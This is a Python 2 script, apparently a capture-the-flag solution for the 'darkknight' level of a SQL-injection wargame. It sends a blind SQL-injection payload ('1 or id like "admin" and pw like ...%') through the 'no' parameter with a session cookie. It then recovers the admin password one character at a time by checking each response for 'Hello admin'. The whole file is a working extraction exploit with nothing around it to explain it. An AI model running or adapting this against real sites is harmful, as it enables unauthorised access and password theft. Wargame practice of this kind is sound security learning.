#!/usr/bin/env python

import urllib
import urllib2

URL = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=9i2i63lhcv8dc6ge2k4pbijlgm"


def query(Q):
    UURL = URL + "?no=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)

    return "<h2>Hello admin</h2>" in res.read()

def guess(pattern):
    return query("1 or id like \"admin\" and pw like \"{}\"".format(pattern))

password = ""
guess_table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'
while len(password) < 8:
    for ch in guess_table:
        if guess(password + ch + "%"):
            password += ch
            print password
            break